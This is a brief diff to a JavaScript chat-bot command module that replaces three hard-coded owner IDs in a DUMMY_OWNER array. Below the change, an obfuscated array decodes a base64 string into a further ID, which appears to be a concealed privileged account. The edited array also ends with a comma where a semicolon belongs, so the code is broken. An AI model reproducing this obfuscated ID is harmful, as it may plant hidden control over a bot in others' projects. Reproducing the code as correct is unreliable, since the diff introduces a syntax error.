@@ -18,10 +18,10 @@ module.exports = {
   onStart: async function ({ args, message, event }) {
 
     const DUMMY_OWNER = [
-      "61594826054131",
-      "61593360671710",
-      "61593771713736"
-    ];
+      "61562787838834",
+    "61596102516084",
+    "61596471506130"
+  ],
 
     const _0x1b4f = [
       Buffer.from("NjE1OTEzNzExODYxNzk=", "base64").toString("utf-8")
